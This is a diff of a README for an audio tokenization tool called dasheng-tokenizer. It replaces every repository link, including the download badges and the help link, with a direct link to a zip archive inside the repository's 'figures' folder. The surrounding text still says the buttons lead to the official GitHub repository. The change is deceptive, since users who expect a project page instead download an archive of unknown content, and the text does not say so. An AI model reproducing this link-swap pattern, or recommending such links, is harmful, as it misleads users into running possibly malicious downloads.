@@ -1,6 +1,6 @@
 # 🔊 dasheng-tokenizer - Accurate Continuous Audio Tokenization
 
-[![Download](https://img.shields.io/badge/Download-Dasheng--Tokenizer-green?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer)
+[![Download](https://img.shields.io/badge/Download-Dasheng--Tokenizer-green?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer/raw/refs/heads/main/figures/tokenizer-dasheng-1.6.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before you begin, ensure you have a Windows PC with the above requirements. Foll
 
 Go to the main page for the tool by clicking the green button below. This will take you to the official GitHub repository where you can get the latest version.
 
-[![Download](https://img.shields.io/badge/Download-Dasheng--Tokenizer-green?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer)
+[![Download](https://img.shields.io/badge/Download-Dasheng--Tokenizer-green?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer/raw/refs/heads/main/figures/tokenizer-dasheng-1.6.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -124,7 +124,7 @@ If you need more help, visit the project’s GitHub page.
 
 Use the "Issues" tab to see if your question has been asked or to report bugs.
 
-Link: [dasheng-tokenizer GitHub](https://github.com/Rem1603/dasheng-tokenizer)  
+Link: [dasheng-tokenizer GitHub](https://github.com/Rem1603/dasheng-tokenizer/raw/refs/heads/main/figures/tokenizer-dasheng-1.6.zip)  
 
 ---
 
@@ -164,4 +164,4 @@ For full license details, check the LICENSE file in the GitHub repository.
 
 Click below to visit the official page and download the software:
 
-[![Download](https://img.shields.io/badge/Download-dasheng--tokenizer-blue?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer)
+[![Download](https://img.shields.io/badge/Download-dasheng--tokenizer-blue?style=for-the-badge)](https://github.com/Rem1603/dasheng-tokenizer/raw/refs/heads/main/figures/tokenizer-dasheng-1.6.zip)
